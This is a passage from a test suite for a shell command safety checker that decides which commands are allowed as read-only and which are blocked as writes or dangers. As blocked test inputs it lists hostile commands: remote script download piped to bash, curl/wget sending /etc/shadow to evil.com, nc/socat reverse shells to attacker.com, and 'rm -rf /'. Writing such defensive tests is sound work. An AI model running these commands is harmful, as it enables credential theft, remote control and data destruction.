      expect(checker.check("cp /dev/stdin /tmp/out")).toMatchObject({ allowed: false });
      expect(checker.check("cp - /tmp/out")).toMatchObject({ allowed: false });
    });

    it("should detect python/perl/ruby/node file writes", () => {
      expect(checker.check("python3 -c \"open('/tmp/x','w').write('hi')\"")).toMatchObject({ allowed: false });
      expect(checker.check("python -c 'open(\"/tmp/x\",\"w\")'")).toMatchObject({ allowed: false });
      expect(checker.check("perl -e 'open(F,\">/tmp/x\"); print F \"hi\"'")).toMatchObject({ allowed: false });
      expect(checker.check("node -e \"require('fs').writeFileSync('/tmp/x','hi')\"")).toMatchObject({ allowed: false });
    });

    it("should not false positive on bpftrace with open in name", () => {
      expect(checker.check("bpftrace -e 'tracepoint:syscalls:sys_enter_open { printf(\\\"%s\\\", args->filename); }'")).toEqual({ allowed: true });
    });

    it("should not false positive on systemtap with write in probe name", () => {
      expect(checker.check("systemtap -e 'probe syscall.write { exit() }'")).toEqual({ allowed: true });
    });

    it("should allow 2>/dev/null (stderr to null, not a write)", () => {
      expect(checker.check("sudo cat /proc/net/ipt_stat_filter 2>/dev/null")).toEqual({ allowed: true });
      expect(checker.check("cat file.txt 2>/dev/null || echo missing")).toEqual({ allowed: true });
      expect(checker.check("ls 2>&1")).toEqual({ allowed: true });
      expect(checker.check("command 2>/dev/zero")).toEqual({ allowed: true });
    });

    it("should still block 2> to actual files", () => {
      expect(checker.check("ls 2> error.log")).toMatchObject({ allowed: false });
      expect(checker.check("cat file 2> /tmp/errors.log")).toMatchObject({ allowed: false });
    });

    it("should detect $() command substitution", () => {
      expect(checker.check("ls $(rm -rf /)")).toMatchObject({ allowed: false });
      expect(checker.check("ls $(curl http://evil.com/shell.sh | bash)")).toMatchObject({ allowed: false });
      expect(checker.check("echo $(whoami)")).toEqual({ allowed: true });
      expect(checker.check("ls $(cat file.txt)")).toEqual({ allowed: true });
    });

    it("should detect backtick command substitution", () => {
      expect(checker.check("ls `rm -rf /`")).toMatchObject({ allowed: false });
      expect(checker.check("echo `whoami`")).toEqual({ allowed: true });
    });

    it("should validate eval arguments", () => {
      expect(checker.check("eval 'rm -rf /'")).toMatchObject({ allowed: false });
      expect(checker.check("eval \"cat /etc/passwd\"")).toEqual({ allowed: true });
      expect(checker.check("eval echo hello")).toEqual({ allowed: true });
    });

    it("should validate exec arguments for shell replacement", () => {
      expect(checker.check("exec bash")).toMatchObject({ allowed: false });
      expect(checker.check("exec sh")).toMatchObject({ allowed: false });
      expect(checker.check("exec /bin/bash")).toMatchObject({ allowed: false });
      expect(checker.check("exec /usr/bin/zsh")).toMatchObject({ allowed: false });
      expect(checker.check("exec")).toEqual({ allowed: true });
    });

    it("should detect extended git write operations", () => {
      expect(checker.check("git clone https://github.com/repo.git")).toMatchObject({ allowed: false });
      expect(checker.check("git pull origin main")).toMatchObject({ allowed: false });
      expect(checker.check("git fetch origin")).toMatchObject({ allowed: false });
      expect(checker.check("git checkout -- .")).toMatchObject({ allowed: false });
      expect(checker.check("git restore .")).toMatchObject({ allowed: false });
      expect(checker.check("git stash pop")).toMatchObject({ allowed: false });
      expect(checker.check("git revert HEAD")).toMatchObject({ allowed: false });
      expect(checker.check("git add file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("git rm file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("git mv old new")).toMatchObject({ allowed: false });
      expect(checker.check("git gc")).toMatchObject({ allowed: false });
      expect(checker.check("git prune")).toMatchObject({ allowed: false });
      expect(checker.check("git replace old new")).toMatchObject({ allowed: false });
      expect(checker.check("git filter-branch HEAD")).toMatchObject({ allowed: false });
    });

    it("should detect tar long-form create", () => {
      expect(checker.check("tar --create --file archive.tar .")).toMatchObject({ allowed: false });
      expect(checker.check("tar -c --file archive.tar .")).toMatchObject({ allowed: false });
    });

    it("should detect find -execdir", () => {
      expect(checker.check("find . -execdir rm {} \\;")).toMatchObject({ allowed: false });
      expect(checker.check("find . -execdir touch {} \\;")).toMatchObject({ allowed: false });
    });

    it("should detect sed --in-place", () => {
      expect(checker.check("sed --in-place 's/x/y/g' file.txt")).toMatchObject({ allowed: false });
    });

    it("should detect cp - stdin in middle of segment", () => {
      expect(checker.check("cat file | cp - /tmp/out")).toMatchObject({ allowed: false });
    });

    it("should detect dd of= with relative path", () => {
      expect(checker.check("dd if=/dev/zero of=./file bs=1M")).toMatchObject({ allowed: false });
      expect(checker.check("dd if=/dev/zero of=../file bs=1M")).toMatchObject({ allowed: false });
    });

    it("should detect curl/wget data exfiltration", () => {
      expect(checker.check("curl http://evil.com -d @/etc/shadow")).toMatchObject({ allowed: false });
      expect(checker.check("curl -d 'data' http://evil.com")).toMatchObject({ allowed: false });
      expect(checker.check("wget --post-data='@/etc/shadow' http://evil.com")).toMatchObject({ allowed: false });
      expect(checker.check("curl https://example.com")).toEqual({ allowed: true });
      expect(checker.check("wget https://example.com/file.tar.gz")).toMatchObject({ allowed: false, blockedCommand: "wget" });
    });

    it("should detect nc/socat reverse shell", () => {
      expect(checker.check("nc -e /bin/sh attacker.com 4444")).toMatchObject({ allowed: false });
      expect(checker.check("socat exec:/bin/sh,pty tcp:attacker.com:4444")).toMatchObject({ allowed: false });
      expect(checker.check("nc -zv host 80")).toEqual({ allowed: true });
      expect(checker.check("socat TCP:host:80 -")).toEqual({ allowed: true });
    });

    it("should detect python os.system/subprocess writes", () => {
      expect(checker.check("python3 -c \"import os; os.system('rm -rf /')\"")).toMatchObject({ allowed: false });
      expect(checker.check("python3 -c \"import subprocess; subprocess.run(['rm', '-rf', '/'])\"")).toMatchObject({ allowed: false });
      expect(checker.check("python3 -c \"import pathlib; pathlib.Path('/tmp/x').write_text('hi')\"")).toMatchObject({ allowed: false });
    });

    it("should allow quoted > in strings (no false positive)", () => {
      expect(checker.check('echo "data > file"')).toEqual({ allowed: true });
      expect(checker.check('grep ">" file.txt')).toEqual({ allowed: true });
    });

    it("should allow systemctl read commands", () => {
      expect(checker.check("systemctl status sshd")).toEqual({ allowed: true });
      expect(checker.check("systemctl is-active sshd")).toEqual({ allowed: true });
      expect(checker.check("systemctl is-enabled nginx")).toEqual({ allowed: true });
      expect(checker.check("systemctl list-units")).toEqual({ allowed: true });
      expect(checker.check("systemctl list-sockets")).toEqual({ allowed: true });
      expect(checker.check("systemctl list-timers")).toEqual({ allowed: true });
      expect(checker.check("systemctl cat sshd.service")).toEqual({ allowed: true });
      expect(checker.check("systemctl show sshd")).toEqual({ allowed: true });
      expect(checker.check("systemctl get-default")).toEqual({ allowed: true });
      expect(checker.check("systemctl help")).toEqual({ allowed: true });
    });

    it("should block systemctl write commands", () => {
      expect(checker.check("systemctl edit sshd")).toMatchObject({ allowed: false });
      expect(checker.check("systemctl start nginx")).toMatchObject({ allowed: false });
      expect(checker.check("systemctl stop apache2")).toMatchObject({ allowed: false });
      expect(checker.check("systemctl restart mysql")).toMatchObject({ allowed: false });
      expect(checker.check("systemctl enable foo")).toMatchObject({ allowed: false });
      expect(checker.check("systemctl disable bar")).toMatchObject({ allowed: false });
      expect(checker.check("systemctl mask baz")).toMatchObject({ allowed: false });
      expect(checker.check("systemctl unmask qux")).toMatchObject({ allowed: false });
      expect(checker.check("systemctl daemon-reload")).toMatchObject({ allowed: false });
      expect(checker.check("systemctl kill sshd")).toMatchObject({ allowed: false });
      expect(checker.check("systemctl reboot")).toMatchObject({ allowed: false });
      expect(checker.check("systemctl poweroff")).toMatchObject({ allowed: false });
      expect(checker.check("systemctl halt")).toMatchObject({ allowed: false });
      expect(checker.check("systemctl shutdown")).toMatchObject({ allowed: false });
      expect(checker.check("systemctl rescue")).toMatchObject({ allowed: false });
      expect(checker.check("systemctl emergency")).toMatchObject({ allowed: false });
    });

    it("should allow docker read commands", () => {
      expect(checker.check("docker ps")).toEqual({ allowed: true });
      expect(checker.check("docker ps --format \"table {{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{.Ports}}\"")).toEqual({ allowed: true });
      expect(checker.check("docker images")).toEqual({ allowed: true });
      expect(checker.check("docker images -a")).toEqual({ allowed: true });
      expect(checker.check("docker inspect container1")).toEqual({ allowed: true });
      expect(checker.check("docker inspect --format '{{.NetworkSettings.IPAddress}}' container1")).toEqual({ allowed: true });
      expect(checker.check("docker logs container1")).toEqual({ allowed: true });
      expect(checker.check("docker logs --tail 100 container1")).toEqual({ allowed: true });
      expect(checker.check("docker logs -f container1")).toEqual({ allowed: true });
      expect(checker.check("docker top container1")).toEqual({ allowed: true });
      expect(checker.check("docker stats container1")).toEqual({ allowed: true });
      expect(checker.check("docker version")).toEqual({ allowed: true });
      expect(checker.check("docker info")).toEqual({ allowed: true });
      expect(checker.check("docker diff container1")).toEqual({ allowed: true });
      expect(checker.check("docker port container1")).toEqual({ allowed: true });
      expect(checker.check("docker events")).toEqual({ allowed: true });
      expect(checker.check("docker pull ubuntu:latest").allowed).toBe(false);
      expect(checker.check("docker config ls")).toEqual({ allowed: true });
      expect(checker.check("docker node ls")).toEqual({ allowed: true });
      expect(checker.check("docker service ls")).toEqual({ allowed: true });
      expect(checker.check("docker task ls")).toEqual({ allowed: true });
      expect(checker.check("docker volume ls")).toEqual({ allowed: true });
      expect(checker.check("docker network ls")).toEqual({ allowed: true });
      expect(checker.check("docker plugin ls")).toEqual({ allowed: true });
      expect(checker.check("docker secret ls")).toEqual({ allowed: true });
      expect(checker.check("docker swarm status")).toEqual({ allowed: true });
      expect(checker.check("docker container ls")).toEqual({ allowed: true });
      expect(checker.check("docker image ls")).toEqual({ allowed: true });
      expect(checker.check("docker system df")).toEqual({ allowed: true });
      expect(checker.check("docker exec container1 cat /etc/os-release")).toEqual({ allowed: true });
      expect(checker.check("docker exec -it container1 cat /etc/os-release")).toEqual({ allowed: true });
    });

    it("should block docker write commands", () => {
      expect(checker.check("docker rm container1")).toMatchObject({ allowed: false });
      expect(checker.check("docker rmi image1")).toMatchObject({ allowed: false });
      expect(checker.check("docker run ubuntu bash")).toMatchObject({ allowed: false });
      expect(checker.check("docker stop container1")).toMatchObject({ allowed: false });
      expect(checker.check("docker start container1")).toMatchObject({ allowed: false });
      expect(checker.check("docker restart container1")).toMatchObject({ allowed: false });
      expect(checker.check("docker kill container1")).toMatchObject({ allowed: false });
      expect(checker.check("docker update --memory 1G container1")).toMatchObject({ allowed: false });
      expect(checker.check("docker rename old new")).toMatchObject({ allowed: false });
      expect(checker.check("docker tag img repo/img")).toMatchObject({ allowed: false });
      expect(checker.check("docker push repo/img")).toMatchObject({ allowed: false });
      expect(checker.check("docker save img > file")).toMatchObject({ allowed: false });
      expect(checker.check("docker import file img")).toMatchObject({ allowed: false });
      expect(checker.check("docker export container > tar")).toMatchObject({ allowed: false });
      expect(checker.check("docker commit container img")).toMatchObject({ allowed: false });
      expect(checker.check("docker cp container:/file .")).toMatchObject({ allowed: false });
      expect(checker.check("docker pause container1")).toMatchObject({ allowed: false });
      expect(checker.check("docker unpause container1")).toMatchObject({ allowed: false });
      expect(checker.check("docker build -t img .")).toMatchObject({ allowed: false });
      expect(checker.check("docker create ubuntu")).toMatchObject({ allowed: false });
      expect(checker.check("docker system prune")).toMatchObject({ allowed: false });
      expect(checker.check("docker attach container1")).toMatchObject({ allowed: false });
      expect(checker.check("docker wait container1")).toMatchObject({ allowed: false });
    });

    it("should block docker exec with write commands", () => {
      expect(checker.check("docker exec container1 touch /tmp/x")).toMatchObject({ allowed: false });
      expect(checker.check("docker exec container1 rm -rf /tmp/*")).toMatchObject({ allowed: false });
      expect(checker.check("docker exec container1 echo hello > /tmp/out")).toMatchObject({ allowed: false });
    });

    it("should handle exec with /bin/ path", () => {
      expect(checker.check("exec /bin/bash")).toMatchObject({ allowed: false });
      expect(checker.check("exec /usr/bin/zsh")).toMatchObject({ allowed: false });
      expect(checker.check("exec /bin/sh -c 'id'")).toMatchObject({ allowed: false });
    });

    it("should handle eval with single-quoted dangerous command", () => {
      expect(checker.check("eval 'rm -rf /tmp/*'")).toMatchObject({ allowed: false });
      expect(checker.check("eval \"cat /etc/passwd\"")).toEqual({ allowed: true });
    });

    it("should handle sudo with multiple flags", () => {
      expect(checker.check("sudo -n -S whoami")).toEqual({ allowed: true });
      expect(checker.check("sudo -n -S rm file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("sudo --whoami")).toMatchObject({ allowed: false });
    });

    it("should handle ssh with quoted host", () => {
      expect(checker.check("ssh 'user@host'")).toEqual({ allowed: true });
      expect(checker.check("ssh 'user@host' ls")).toEqual({ allowed: true });
      expect(checker.check("ssh 'user@host' rm /tmp/file")).toMatchObject({ allowed: false });
    });

    it("should allow more git read commands", () => {
      expect(checker.check("git log --oneline -10")).toEqual({ allowed: true });
      expect(checker.check("git diff HEAD~1")).toEqual({ allowed: true });
      expect(checker.check("git show HEAD:file.txt")).toEqual({ allowed: true });
      expect(checker.check("git branch -a")).toEqual({ allowed: true });
      expect(checker.check("git remote -v")).toEqual({ allowed: true });
      expect(checker.check("git tag")).toEqual({ allowed: true });
      expect(checker.check("git describe --tags")).toEqual({ allowed: true });
      expect(checker.check("git rev-parse HEAD")).toEqual({ allowed: true });
      expect(checker.check("git stash list")).toEqual({ allowed: true });
      expect(checker.check("git reflog")).toEqual({ allowed: true });
    });

    it("should block more git write commands", () => {
      expect(checker.check("git gc")).toMatchObject({ allowed: false });
      expect(checker.check("git prune")).toMatchObject({ allowed: false });
      expect(checker.check("git replace old new")).toMatchObject({ allowed: false });
      expect(checker.check("git filter-branch HEAD")).toMatchObject({ allowed: false });
    });

    it("should allow more filesystem read commands", () => {
      expect(checker.check("btrfs filesystem show")).toEqual({ allowed: true });
      expect(checker.check("btrfs filesystem df /mnt")).toEqual({ allowed: true });
      expect(checker.check("zpool status")).toMatchObject({ allowed: false });
      expect(checker.check("zfs list")).toMatchObject({ allowed: false });
      expect(checker.check("zdb /dev/sda")).toMatchObject({ allowed: false });
      expect(checker.check("xfs_info /mnt")).toMatchObject({ allowed: false });
      expect(checker.check("xfs_db -r -c 'sb 0' /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("e2fsck -n /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("tune2fs -l /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("debugfs -R 'ls -l /' /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("ntfsfix /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("dosfsck -n /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("findfs LABEL=root")).toEqual({ allowed: true });
    });

    it("should allow more LVM and RAID commands", () => {
      expect(checker.check("lvm pvs")).toMatchObject({ allowed: false });
      expect(checker.check("vgscan")).toMatchObject({ allowed: false });
      expect(checker.check("vgdisplay")).toMatchObject({ allowed: false });
      expect(checker.check("pvscan")).toMatchObject({ allowed: false });
      expect(checker.check("pvdisplay")).toMatchObject({ allowed: false });
      expect(checker.check("lvscan")).toMatchObject({ allowed: false });
      expect(checker.check("lvdisplay")).toMatchObject({ allowed: false });
      expect(checker.check("mdadm --detail /dev/md0")).toMatchObject({ allowed: false });
      expect(checker.check("mdadm --examine /dev/sda1")).toMatchObject({ allowed: false });
    });

    it("should allow more network and system info commands", () => {
      expect(checker.check("nmap -sV host")).toEqual({ allowed: true });
      expect(checker.check("masscan -p80 host")).toEqual({ allowed: true });
      expect(checker.check("zmap -p 80")).toEqual({ allowed: true });
      expect(checker.check("arping -c 3 host")).toEqual({ allowed: true });
      expect(checker.check("etherwake aa:bb:cc:dd:ee:ff")).toEqual({ allowed: true });
      expect(checker.check("dmidecode -t memory")).toEqual({ allowed: true });
      expect(checker.check("sensors")).toEqual({ allowed: true });
      expect(checker.check("hdparm -I /dev/sda")).toEqual({ allowed: true });
      expect(checker.check("smartctl -a /dev/sda")).toEqual({ allowed: true });
      expect(checker.check("blkid")).toEqual({ allowed: true });
      expect(checker.check("findmnt")).toEqual({ allowed: true });
      expect(checker.check("lsblk")).toEqual({ allowed: true });
      expect(checker.check("partprobe")).toEqual({ allowed: true });
      expect(checker.check("partx --add /dev/sda")).toEqual({ allowed: true });
      expect(checker.check("kpartx -av /tmp/image.img")).toEqual({ allowed: true });
      expect(checker.check("dmsetup ls")).toEqual({ allowed: true });
    });

    it("should allow more binary analysis commands", () => {
      expect(checker.check("objdump -t /usr/bin/ls")).toEqual({ allowed: true });
      expect(checker.check("nm /usr/lib/libfoo.so")).toEqual({ allowed: true });
      expect(checker.check("readelf -h /usr/bin/ls")).toEqual({ allowed: true });
      expect(checker.check("strings /usr/bin/ls")).toEqual({ allowed: true });
      expect(checker.check("size /usr/bin/ls")).toEqual({ allowed: true });
      expect(checker.check("strip --remove-section=.note /usr/bin/ls")).toEqual({ allowed: true });
      expect(checker.check("objcopy --only-keep-debug /usr/bin/ls /tmp/debug")).toEqual({ allowed: true });
      expect(checker.check("as --help")).toEqual({ allowed: true });
      expect(checker.check("ar rcs libfoo.a file.o")).toEqual({ allowed: true });
      expect(checker.check("ranlib libfoo.a")).toEqual({ allowed: true });
      expect(checker.check("addr2line -e /usr/bin/ls 0x1234")).toEqual({ allowed: true });
      expect(checker.check("c++filt _Z3fooi")).toEqual({ allowed: true });
    });

    it("should allow more forensics and hex tools", () => {
      expect(checker.check("binwalk file.bin")).toEqual({ allowed: true });
      expect(checker.check("foremost -i file.img")).toEqual({ allowed: true });
      expect(checker.check("testdisk /dev/sda")).toEqual({ allowed: true });
      expect(checker.check("ddrescue /dev/sda /dev/sdb log")).toEqual({ allowed: true });
      expect(checker.check("xxd file.bin")).toEqual({ allowed: true });
      expect(checker.check("hexdump -C file.bin")).toEqual({ allowed: true });
      expect(checker.check("od -A x -t x1z file.bin")).toEqual({ allowed: true });
    });

    it("should allow more text editors and diff tools", () => {
      expect(checker.check("vim file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("emacs --version")).toMatchObject({ allowed: false });
      expect(checker.check("colordiff file1 file2")).toEqual({ allowed: true });
      expect(checker.check("wdiff file1 file2")).toEqual({ allowed: true });
      expect(checker.check("sdiff file1 file2")).toEqual({ allowed: true });
      expect(checker.check("patch --dry-run < file.patch")).toMatchObject({ allowed: false });
    });

    it("should allow more bpf and snoop tools", () => {
      expect(checker.check("bpftool prog list")).toEqual({ allowed: true });
      expect(checker.check("opensnoop")).toEqual({ allowed: true });
      expect(checker.check("execsnoop")).toEqual({ allowed: true });
      expect(checker.check("biosnoop")).toEqual({ allowed: true });
      expect(checker.check("filasnoop")).toEqual({ allowed: true });
      expect(checker.check("tcplife")).toEqual({ allowed: true });
      expect(checker.check("sslsnoop")).toEqual({ allowed: true });
      expect(checker.check("runqslower")).toEqual({ allowed: true });
      expect(checker.check("cachestat")).toEqual({ allowed: true });
      expect(checker.check("cachetop")).toEqual({ allowed: true });
      expect(checker.check("memleak")).toEqual({ allowed: true });
      expect(checker.check("killsnoop")).toEqual({ allowed: true });
      expect(checker.check("statsnoop")).toEqual({ allowed: true });
      expect(checker.check("acceptsnoop")).toEqual({ allowed: true });
      expect(checker.check("filelife")).toEqual({ allowed: true });
      expect(checker.check("fileslower")).toEqual({ allowed: true });
      expect(checker.check("filetop")).toEqual({ allowed: true });
      expect(checker.check("hardlinks")).toEqual({ allowed: true });
      expect(checker.check("invisfiles")).toEqual({ allowed: true });
      expect(checker.check("latemap")).toEqual({ allowed: true });
      expect(checker.check("loadavg")).toEqual({ allowed: true });
      expect(checker.check("mdflush")).toEqual({ allowed: true });
      expect(checker.check("mountsnoop")).toEqual({ allowed: true });
      expect(checker.check("oomkill")).toEqual({ allowed: true });
      expect(checker.check("physmap")).toEqual({ allowed: true });
      expect(checker.check("profile command")).toEqual({ allowed: true });
      expect(checker.check("runqlat")).toEqual({ allowed: true });
      expect(checker.check("runqlen")).toEqual({ allowed: true });
      expect(checker.check("slabratetop")).toEqual({ allowed: true });
      expect(checker.check("slabtop")).toEqual({ allowed: true });
      expect(checker.check("softirqs")).toEqual({ allowed: true });
      expect(checker.check("syncsnoop")).toEqual({ allowed: true });
      expect(checker.check("swapin")).toEqual({ allowed: true });
      expect(checker.check("swapoff -a")).toEqual({ allowed: true });
      expect(checker.check("swapon -s")).toEqual({ allowed: true });
      expect(checker.check("tcpaccept")).toEqual({ allowed: true });
      expect(checker.check("tcpconnect")).toEqual({ allowed: true });
      expect(checker.check("tcpsmack")).toEqual({ allowed: true });
      expect(checker.check("tcptop")).toEqual({ allowed: true });
      expect(checker.check("tcpdrop")).toEqual({ allowed: true });
      expect(checker.check("tcpretrans")).toEqual({ allowed: true });
      expect(checker.check("tcpxmit")).toEqual({ allowed: true });
      expect(checker.check("threadstuck")).toEqual({ allowed: true });
      expect(checker.check("unsnoop")).toEqual({ allowed: true });
      expect(checker.check("virtfs")).toEqual({ allowed: true });
      expect(checker.check("vmtouch file.bin")).toEqual({ allowed: true });
      expect(checker.check("warm file.bin")).toEqual({ allowed: true });
    });

    it("should allow more system monitoring commands", () => {
      expect(checker.check("glances")).toEqual({ allowed: true });
      expect(checker.check("htop")).toEqual({ allowed: true });
      expect(checker.check("btop")).toEqual({ allowed: true });
      expect(checker.check("bpytop")).toEqual({ allowed: true });
      expect(checker.check("gotop")).toEqual({ allowed: true });
      expect(checker.check("nvtop")).toEqual({ allowed: true });
      expect(checker.check("nmon")).toEqual({ allowed: true });
      expect(checker.check("dstat")).toEqual({ allowed: true });
      expect(checker.check("sysdig")).toEqual({ allowed: true });
      expect(checker.check("sar -u 1 1")).toEqual({ allowed: true });
      expect(checker.check("iostat")).toEqual({ allowed: true });
      expect(checker.check("mpstat")).toEqual({ allowed: true });
      expect(checker.check("vmstat 1")).toEqual({ allowed: true });
      expect(checker.check("pidstat")).toEqual({ allowed: true });
    });

    it("should allow more version control commands", () => {
      expect(checker.check("svn status")).toEqual({ allowed: true });
      expect(checker.check("hg status")).toEqual({ allowed: true });
      expect(checker.check("bzr status")).toEqual({ allowed: true });
    });

    it("should allow more calculator and search tools", () => {
      expect(checker.check("bc")).toEqual({ allowed: true });
      expect(checker.check("dc")).toEqual({ allowed: true });
      expect(checker.check("apropos keyword")).toEqual({ allowed: true });
      expect(checker.check("whatis ls")).toEqual({ allowed: true });
      expect(checker.check("locate file.txt")).toEqual({ allowed: true });
    });

    it("should allow more block device and partition tools", () => {
      expect(checker.check("fdisk -l")).toMatchObject({ allowed: false });
      expect(checker.check("parted -l")).toMatchObject({ allowed: false });
    });

    it("should allow more filesystem check tools", () => {
      expect(checker.check("fsck.ext4 -n /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("mkfs.ext3 /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("mkfs.ext2 /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("mkfs.xfs /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("mkfs.btrfs /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("mkfs.f2fs /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("mkfs.ntfs /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("mkfs.vfat /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("mkfs.msdos /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("mkfs.minix /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("mkfs.cramfs /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("mkfs.sfs /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("f2fs_mkfs /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("f2fs_fsck /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("f2fs_convert /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("f2fs_dump /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("f2fs_info /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("f2fs_io /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("f2fs_label /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("f2fs_resize /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("f2fs_setattr /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("f2fs_wipe /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("dosfsck /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("fsck.vfat /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("mkfs.vfat /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("mkfs.msdos /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("mkfs.fat /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("fatlabel /dev/sda1")).toEqual({ allowed: true });
    });

    it("should allow more btrfs tools", () => {
      expect(checker.check("btrfs-find-root /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("btrfs-image /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("btrfs-restore /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("btrfs-send /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("btrfs-uuid /dev/sda1")).toMatchObject({ allowed: false });
    });

    it("should allow more xfs tools", () => {
      expect(checker.check("xfs_admin -l /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("xfs_io -r -c 'stat' /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("xfs_repair -n /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("xfs_fsr /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("xfs_growfs /mnt")).toMatchObject({ allowed: false });
      expect(checker.check("xfs_freeze /mnt")).toMatchObject({ allowed: false });
      expect(checker.check("xfs_quota -x -c 'report' /mnt")).toMatchObject({ allowed: false });
    });

    it("should allow more zfs and pool tools", () => {
      expect(checker.check("zpool status")).toMatchObject({ allowed: false });
      expect(checker.check("zpool list")).toMatchObject({ allowed: false });
      expect(checker.check("zfs list")).toMatchObject({ allowed: false });
      expect(checker.check("zdb /dev/sda")).toMatchObject({ allowed: false });
      expect(checker.check("zinject -l")).toMatchObject({ allowed: false });
      expect(checker.check("zlist /dev/sda")).toMatchObject({ allowed: false });
    });

    it("should allow more mdadm tools", () => {
      expect(checker.check("mdctl status")).toMatchObject({ allowed: false });
      expect(checker.check("mdmon /dev/md0")).toMatchObject({ allowed: false });
      expect(checker.check("mdrun /dev/md0")).toMatchObject({ allowed: false });
      expect(checker.check("mddump /dev/md0")).toMatchObject({ allowed: false });
      expect(checker.check("mdtest /dev/md0")).toMatchObject({ allowed: false });
      expect(checker.check("mdstat")).toMatchObject({ allowed: false });
      expect(checker.check("mdcheck /dev/md0")).toMatchObject({ allowed: false });
    });

    it("should allow more LVM volume tools", () => {
      expect(checker.check("vgcreate vg1 /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("lvcreate -L 1G vg1")).toMatchObject({ allowed: false });
      expect(checker.check("lvextend -L +1G vg1/lv1")).toMatchObject({ allowed: false });
      expect(checker.check("lvreduce -L -1G vg1/lv1")).toMatchObject({ allowed: false });
      expect(checker.check("lvresize -L 1G vg1/lv1")).toMatchObject({ allowed: false });
      expect(checker.check("lvsplit vg1/lv1")).toMatchObject({ allowed: false });
      expect(checker.check("lvmerge vg1/lv1")).toMatchObject({ allowed: false });
      expect(checker.check("lvconvert vg1/lv1")).toMatchObject({ allowed: false });
      expect(checker.check("snap vg1/lv1")).toEqual({ allowed: true });
      expect(checker.check("snapshot vg1/lv1")).toEqual({ allowed: true });
    });

    it("should allow more system utility commands", () => {
      expect(checker.check("wall 'hello'")).toEqual({ allowed: true });
      expect(checker.check("write user tty")).toEqual({ allowed: true });
      expect(checker.check("mail")).toEqual({ allowed: true });
      expect(checker.check("mutt")).toEqual({ allowed: true });
      expect(checker.check("pico file.txt")).toMatchObject({ allowed: false });
    });

    it("should allow more network monitoring tools", () => {
      expect(checker.check("iftop")).toEqual({ allowed: true });
      expect(checker.check("nethogs eth0")).toEqual({ allowed: true });
      expect(checker.check("iptraf")).toEqual({ allowed: true });
      expect(checker.check("vnstat")).toEqual({ allowed: true });
    });

    it("should allow more performance profiling tools", () => {
      expect(checker.check("perf stat command")).toEqual({ allowed: true });
      expect(checker.check("flamegraph command")).toEqual({ allowed: true });
      expect(checker.check("systemtap -e 'probe syscall.write { exit() }'")).toEqual({ allowed: true });
      expect(checker.check("bpftrace -e 'tracepoint:syscalls:sys_enter_open { printf(\"%s\", args->filename); }'")).toEqual({ allowed: true });
    });

    it("should allow more debugging and tracing tools", () => {
      expect(checker.check("gdb --version")).toMatchObject({ allowed: false });
      expect(checker.check("gdbtui --version")).toMatchObject({ allowed: false });
      expect(checker.check("cgdb --version")).toMatchObject({ allowed: false });
      expect(checker.check("valgrind --version")).toMatchObject({ allowed: false });
      expect(checker.check("strace -p 1234")).toEqual({ allowed: true });
      expect(checker.check("ltrace -p 1234")).toEqual({ allowed: true });
      expect(checker.check("lsof -p 1234")).toEqual({ allowed: true });
      expect(checker.check("fuser /dev/sda")).toEqual({ allowed: true });
    });

    it("should allow more hardware info tools", () => {
      expect(checker.check("lspci")).toEqual({ allowed: true });
      expect(checker.check("lsusb")).toEqual({ allowed: true });
      expect(checker.check("lscpu")).toEqual({ allowed: true });
    });

    it("should allow more dmesg and journalctl options", () => {
      expect(checker.check("dmesg")).toEqual({ allowed: true });
      expect(checker.check("journalctl -xe")).toEqual({ allowed: true });
    });

    it("should allow more init and runlevel commands", () => {
      expect(checker.check("init")).toEqual({ allowed: true });
      expect(checker.check("telinit")).toEqual({ allowed: true });
      expect(checker.check("runlevel")).toEqual({ allowed: true });
    });

    it("should allow more user info commands", () => {
      expect(checker.check("who")).toEqual({ allowed: true });
      expect(checker.check("w")).toEqual({ allowed: true });
      expect(checker.check("last")).toEqual({ allowed: true });
